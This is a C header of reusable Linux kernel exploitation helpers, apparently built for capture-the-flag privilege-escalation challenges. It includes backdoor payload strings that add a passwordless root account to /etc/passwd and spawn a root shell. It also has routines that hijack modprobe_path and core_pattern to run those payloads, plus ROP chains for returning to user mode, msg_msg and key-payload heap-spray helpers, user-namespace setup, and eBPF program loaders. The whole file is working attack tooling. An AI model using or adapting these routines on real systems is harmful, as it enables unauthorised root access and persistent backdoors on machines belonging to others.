#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/sendfile.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <linux/bpf.h>

// log
#define LOG(fmt, ...) printf("[%s] " fmt "\n", __func__, ##__VA_ARGS__)

// utils
typedef uint64_t u64;
typedef uint32_t u32;
typedef uint16_t u16;
typedef uint8_t u8;
static u64 kaslr_base = 0xffffffff81000000;

#define IDT_ADDR 0xfffffe0000000000

#define PAGE_SIZE 0x1000

#define KERNEL_LOWER_BOUND 0xffffffff80000000ull
#define KERNEL_UPPER_BOUND 0xffffffffc0000000ull

#define STEP_KERNEL 0x100000ull
#define SCAN_START_KERNEL KERNEL_LOWER_BOUND
#define SCAN_END_KERNEL KERNEL_UPPER_BOUND
#define ARR_SIZE_KERNEL (SCAN_END_KERNEL - SCAN_START_KERNEL) / STEP_KERNEL

#define PHYS_LOWER_BOUND 0xffff888000000000ull
#define PHYS_UPPER_BOUND 0xfffffe0000000000ull

#define STEP_PHYS 0x40000000ull
#define SCAN_START_PHYS PHYS_LOWER_BOUND
#define SCAN_END_PHYS PHYS_UPPER_BOUND
#define ARR_SIZE_PHYS (SCAN_END_PHYS - SCAN_START_PHYS) / STEP_PHYS

#define SYSCHK(x)                                                              \
  ({                                                                           \
    typeof(x) __res = (x);                                                     \
    if (__res == (typeof(x))-1) {                                              \
      fprintf(stderr, "%s: %s\n", "SYSCHK(" #x ")", strerror(errno));          \
      exit(1);                                                                 \
    }                                                                          \
    __res;                                                                     \
  })
#define rep_(i, a_, b_, a, b, ...)                                             \
  for (int i = (a), i##_len = (b); i < i##_len; ++i)
#define rep(i, ...) rep_(i, __VA_ARGS__, __VA_ARGS__, 0, __VA_ARGS__)
#define swap(a, b)                                                             \
  do {                                                                         \
    typeof(a) __swap_temp = (a);                                               \
    (a) = (b);                                                                 \
    (b) = __swap_temp;                                                         \
  } while (0)
#define WAIT_UNTIL(x)                                                          \
  while (!(x))                                                                 \
    ;

static void assign_to_core(int core_id) {
  cpu_set_t cpuset;
  CPU_ZERO(&cpuset);
  CPU_SET(core_id, &cpuset);
  sched_setaffinity(getpid(), sizeof(cpu_set_t), &cpuset);
}

static void thread_assign_to_core(int core_id) {
  cpu_set_t cpuset;
  CPU_ZERO(&cpuset);
  CPU_SET(core_id, &cpuset);
  SYSCHK(pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset));
}

static void hexdump(void *ptr, u64 len) {
  char *addr = (char *)ptr;
  rep(i, len) {
    if (i && !(i % 0x10))
      puts("");
    else if (i && !(i % 0x4))
      printf(" ");
    printf("%02hhx", addr[i]);
  }
  puts("");
}

// LPE
#define BACKDOOR_FILE "/tmp/bd"
#define XD_FILE "/tmp/xd"
#define CORE_PATTERN_MEMFD "|/proc/%P/fd/777"
#define LPE_ETC_PASSWD "#!/bin/sh\necho pwn::0:0::/:/bin/sh>>/etc/passwd"
#define LPE_BILLY                                                              \
  "#!/bin/sh\nPID=`pidof billy`\n"                                             \
  "/bin/cat /flag* /root/flag*\n"                                              \
  "/bin/sh >/proc/$PID/fd/1 </proc/$PID/fd/0 2>&1"
#define LPE_BASH_BILLY                                                         \
  "#!/bin/bash\nPID=`pidof billy`\n"                                           \
  "/bin/cat /flag* /root/flag*\n"                                              \
  "/bin/bash &>/proc/$PID/fd/1 </proc/$PID/fd/0"

static void init_billy(char **argv) {
  if (!fork()) {
    assign_to_core(1);
    strcpy(argv[0], "billy");
    sleep(99999);
  }
}

static void sh() {
  char *argv[] = {(char *)"/bin/sh", NULL};
  execve("/bin/sh", argv, NULL);
}

static void new_modprobe_win(const char *backdoor_file, const char *backdoor_cmd) {
  int bd = SYSCHK(open(backdoor_file, O_RDWR | O_CREAT, 0775));
  SYSCHK(write(bd, backdoor_cmd, strlen(backdoor_cmd) + 1));
  int sk = SYSCHK(socket(AF_INET, SOCK_STREAM, 0));
  ioctl(sk, SIOCGIFBR, NULL);
}

/*
 * set modprobe_path to backdoor_file
 */
static void modprobe_win(const char *backdoor_file, const char *backdoor_cmd) {
  puts("[*] win!!");
  int xd = SYSCHK(open(XD_FILE, O_RDWR | O_CREAT, 0775));
  int bd = SYSCHK(open(backdoor_file, O_RDWR | O_CREAT, 0775));
  SYSCHK(write(xd, "\xdd\xdd", 2));
  SYSCHK(write(bd, backdoor_cmd, strlen(backdoor_cmd) + 1));
  system(XD_FILE);
}

/*
 * set core_pattern to backdoor_file
 */
static void core_pattern_win(const char *backdoor_file,
                             const char *backdoor_cmd) {
  if (!fork()) {
    puts("[*] win!!");
    int fd = SYSCHK(open(backdoor_file, O_RDWR | O_CREAT, 0775));
    SYSCHK(write(fd, backdoor_cmd, strlen(backdoor_cmd) + 1));
    close(fd);
    *(u8 *)0 = 0;
  }
  sleep(9999);
}

/*
 * set core_pattern to CORE_PATTERN_MEMFD
 */
static void core_pattern_win_memfd() {
  if (!fork()) {
    puts("[*] win!!");
    int fd = memfd_create("", 0);
    SYSCHK(write(fd, LPE_BILLY, sizeof(LPE_BILLY)));
    dup2(fd, 777);
    close(fd);
    *(u8 *)0 = 0;
  }
  sleep(9999);
}

// ROP
static u64 user_cs, user_ss, user_sp, user_rflags;

static void inline restore_state() {
  asm volatile("swapgs;"
               "mov %0, 0x20(%%rsp)\n"
               "mov %1, 0x18(%%rsp)\n"
               "mov %2, 0x10(%%rsp)\n"
               "mov %3, 0x08(%%rsp)\n"
               "mov %4, 0x00(%%rsp)\n"
               "iretq"
               :
               : "r"(user_ss), "r"(user_sp), "r"(user_rflags), "r"(user_cs),
                 "r"(sh));
}
static void save_state(void) {
  asm("mov %%cs, %0\n"
      "mov %%ss, %1\n"
      "mov %%rsp, %2\n"
      "pushf\n"
      "pop %3\n"
      : "=r"(user_cs), "=r"(user_ss), "=r"(user_sp), "=r"(user_rflags)
      :
      : "memory");
}

/*
 * swapgs: `mov rdi, rsp` in swapgs_restore_regs_and_return_to_usermode
 */
static void rop_ret2user(char *buf, void *swapgs, void *ret_addr) {
  save_state();
  u64 *rop = (u64 *)buf;
  *rop++ = (u64)swapgs;
  *rop++ = 0xdead;
  *rop++ = 0xbeaf;
  *rop++ = (u64)ret_addr;
  *rop++ = user_cs;
  *rop++ = user_rflags;
  *rop++ = user_sp + 8; // remove +8 in case not work
  *rop++ = user_ss;
}

static void rop_telefork(char *buf, void *__do_sys_fork, void *msleep,
                         void *pop_rdi) {
  u64 *rop = (u64 *)buf;
  *rop++ = (u64)__do_sys_fork;
  *rop++ = (u64)pop_rdi;
  *rop++ = (u64)0xffffffff;
  *rop++ = (u64)msleep;
}

/*
 * in case rdi is big enough
 */
static void rop_telefork_no_pop_rdi(char *buf, void *__do_sys_fork,
                                    void *msleep) {
  u64 *rop = (u64 *)buf;
  *rop++ = (u64)__do_sys_fork;
  *rop++ = (u64)msleep;
}

// msg_msg
#define SIZE_MSGMSG_HEADER 0x38

int static get_msg_queue(void) { return msgget(IPC_PRIVATE, 0666 | IPC_CREAT); }

int static read_msg(int msqid, void *msgp, size_t msgsz, long msgtyp) {
  return msgrcv(msqid, msgp, msgsz, msgtyp, 0);
}

/**
 * the msgp should be a pointer to the `struct msgbuf`,
 * and the data should be stored in msgbuf.mtext
 */
int static write_msg(int msqid, void *msgp, size_t msgsz, long msgtyp) {
  ((struct msgbuf *)msgp)->mtype = msgtyp;
  return msgsnd(msqid, msgp, msgsz, 0);
}

/* for MSG_COPY, `msgtyp` means to read no.msgtyp msg_msg on the queue */
int static peek_msg(int msqid, void *msgp, size_t msgsz, long msgtyp) {
  return msgrcv(msqid, msgp, msgsz, msgtyp,
                MSG_COPY | IPC_NOWAIT | MSG_NOERROR);
}

// VIRT
#define PTE2V(i) ((unsigned long long)(i) << 12)
#define PMD2V(i) ((unsigned long long)(i) << 21)
#define PUD2V(i) ((unsigned long long)(i) << 30)
#define PGD2V(i) ((unsigned long long)(i) << 39)

#define V2PTE(i) (((unsigned long long)(i) >> 12) & 0x1ff)
#define V2PMD(i) (((unsigned long long)(i) >> 21) & 0x1ff)
#define V2PUD(i) (((unsigned long long)(i) >> 30) & 0x1ff)
#define V2PGD(i) (((unsigned long long)(i) >> 39) & 0x1ff)

#define PTI_TO_VIRT(pgd_index, pud_index, pmd_index, pte_index, byte_index)    \
  ((void *)(PGD2V((unsigned long long)(pgd_index)) +                           \
            PUD2V((unsigned long long)(pud_index)) +                           \
            PMD2V((unsigned long long)(pmd_index)) +                           \
            PTE2V((unsigned long long)(pte_index)) +                           \
            (unsigned long long)(byte_index)))
#define USER_PAGETABLE(phys_addr) ((u64)phys_addr | 0x67 | (1ul << 63))

static void flush_tlb() {
  short *status;
  void *addr;
  const int len = 0x1000;

  status = (short *)mmap(NULL, sizeof(short), PROT_READ | PROT_WRITE,
                         MAP_SHARED | MAP_ANONYMOUS, -1, 0);
  addr = (short *)mmap(NULL, len, PROT_READ | PROT_WRITE,
                       MAP_SHARED | MAP_ANONYMOUS, -1, 0);

  *status = 0;
  if (!fork()) {
    munmap(addr, len);
    *status = 1;
    sleep(9999);
  }

  while (*status == 0)
    ;

  munmap(status, sizeof(short));
}

// user_key_payload
#define KEY_SPEC_PROCESS_KEYRING -2
#define KEYCTL_REVOKE 3
#define UKP_MAX 0x52
typedef int32_t key_serial_t;

static inline key_serial_t add_key(const char *type, const char *description,
                                   const void *payload, size_t plen,
                                   key_serial_t ringid) {
  return syscall(__NR_add_key, type, description, payload, plen, ringid);
}

static inline long keyctl(int operation, unsigned long arg2, unsigned long arg3,
                          unsigned long arg4, unsigned long arg5) {
  return syscall(__NR_keyctl, operation, arg2, arg3, arg4, arg5);
}
static key_serial_t ukp_add(const char *key_name, const char *content,
                            u64 size) {
  return add_key("user", key_name, content, size - /* payload header */ 0x18,
                 KEY_SPEC_PROCESS_KEYRING);
}

static void ukp_del(key_serial_t key) { keyctl(KEYCTL_REVOKE, key, 0, 0, 0); }

// namespace
static void unshare_setup() {
  u32 uid = getuid(), gid = getgid();
  int temp, ret;
  char edit[0x100];
  SYSCHK(unshare(CLONE_NEWNET | CLONE_NEWUSER));
  temp = SYSCHK(open("/proc/self/setgroups", O_WRONLY));
  SYSCHK(write(temp, "deny", strlen("deny")));
  SYSCHK(close(temp));
  temp = SYSCHK(open("/proc/self/uid_map", O_WRONLY));
  snprintf(edit, sizeof(edit), "0 %d 1", uid);
  SYSCHK(write(temp, edit, strlen(edit)));
  SYSCHK(close(temp));
  temp = SYSCHK(open("/proc/self/gid_map", O_WRONLY));
  snprintf(edit, sizeof(edit), "0 %d 1", gid);
  SYSCHK(write(temp, edit, strlen(edit)));
  SYSCHK(close(temp));
  return;
}

// BPF

#define BPF_LOG_LEVEL1  1
#define BPF_LOG_LEVEL2  2
#define BPF_LOG_STATS   4
#define BPF_LOG_FIXED   8

static u32 bpf_log_level = BPF_LOG_LEVEL2 | BPF_LOG_STATS;
static char bpf_log_buf[0x100000];

#define BPF_REG_ARG1	BPF_REG_1
#define BPF_REG_ARG2	BPF_REG_2
#define BPF_REG_ARG3	BPF_REG_3
#define BPF_REG_ARG4	BPF_REG_4
#define BPF_REG_ARG5	BPF_REG_5
#define BPF_REG_CTX	BPF_REG_6
#define BPF_REG_FP	BPF_REG_10

#define EXP_BPF_MAP_LOOKUP(FD, SZ, DST, KEY)                                   \
  BPF_ST_MEM(BPF_DW, BPF_REG_FP, -0x8, KEY), BPF_LD_MAP_FD(BPF_REG_ARG1, FD),  \
      BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),                                 \
      BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -0x8),                              \
      BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),                                 \
      BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1), BPF_EXIT_INSN(),                  \
      BPF_LDX_MEM(SZ, DST, BPF_REG_0, 0)

#define EXP_BPF_MAP_UPDATE(FD, SZ, KEY, SRC)                                   \
  BPF_MOV64_REG(BPF_REG_5, SRC), BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),      \
      BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -8),                                \
      BPF_ST_MEM(BPF_DW, BPF_REG_ARG2, 0, KEY),                                \
      BPF_MOV64_REG(BPF_REG_ARG3, BPF_REG_ARG2),                               \
      BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG3, -8),                                \
      BPF_STX_MEM(BPF_DW, BPF_REG_ARG3, BPF_REG_5, 0),                         \
      BPF_LD_MAP_FD(BPF_REG_ARG1, FD), BPF_MOV64_IMM(BPF_REG_ARG4, 0),         \
      BPF_EMIT_CALL(BPF_FUNC_map_update_elem)

static int bpf(enum bpf_cmd cmd, union bpf_attr *attr){
    return syscall(__NR_bpf, cmd, attr, sizeof(*attr));
}

static int bpf_create_map(enum bpf_map_type map_type, u32 value_size, unsigned int max_entries){
	union bpf_attr attr = {
		.map_type    = map_type,
		.key_size    = sizeof(uint32_t),
		.value_size  = value_size,
		.max_entries = max_entries
	};

	return bpf(BPF_MAP_CREATE, &attr);
}

static int bpf_lookup_elem(u32 fd, uint32_t key, void *value){
	union bpf_attr attr = {
		.map_fd = fd,
		.key    = (uint64_t)&key,
		.value  = (uint64_t)value,
	};

	return bpf(BPF_MAP_LOOKUP_ELEM, &attr);
}

static int bpf_update_elem(u32 fd, uint32_t key, const void *value, uint64_t flags){
	union bpf_attr attr = {
		.map_fd = fd,
		.key    = (uint64_t)&key,
		.value  = (uint64_t)value,
		.flags  = flags,
	};

	return bpf(BPF_MAP_UPDATE_ELEM, &attr);
}

static int bpf_delete_elem(u32 fd, uint32_t key){
	union bpf_attr attr = {
		.map_fd = fd,
		.key    = (uint64_t)&key,
	};

	return bpf(BPF_MAP_DELETE_ELEM, &attr);
}

static int bpf_prog_load(enum bpf_prog_type type, const struct bpf_insn *insns, u32 insn_cnt){
  int ret;
	union bpf_attr attr = {
		.prog_type = type,
		.insn_cnt  = insn_cnt,
		.insns     = (uint64_t)insns,
		.license   = (uint64_t)"GPL",
		.log_level = bpf_log_level,
		.log_size  = sizeof(bpf_log_buf),
		.log_buf   = (uint64_t)bpf_log_buf,
	};
  ret = bpf(BPF_PROG_LOAD, &attr);
  if (bpf_log_level)
    puts(bpf_log_buf);
	return ret;
}


// raw
#define syscall0(n) syscall6(n,0,0,0,0,0,0)
#define syscall1(n,a) syscall6(n,(long)a,0,0,0,0,0)
#define syscall2(n,a,b) syscall6(n,(long)a,(long)b,0,0,0,0)
#define syscall3(n,a,b,c) syscall6(n,(long)a,(long)b,(long)c,0,0,0)
#define syscall4(n,a,b,c,d) syscall6(n,(long)a,(long)b,(long)c,(long)d,0,0)
#define syscall5(n,a,b,c,d,e) syscall6(n,(long)a,(long)b,(long)c,(long)d,(long)e,0)
static inline long syscall6(long n, long a1, long a2, long a3, long a4, long a5, long a6) {
    long ret;
    register long r10 __asm__("r10") = a4;
    register long r8  __asm__("r8")  = a5;
    register long r9  __asm__("r9")  = a6;

    __asm__ volatile (
        "syscall"
        : "=a"(ret)
        : "a"(n),
          "D"(a1),
          "S"(a2),
          "d"(a3),
          "r"(r10),
          "r"(r8),
          "r"(r9)
        : "rcx", "r11", "memory"
    );

    return ret;
}

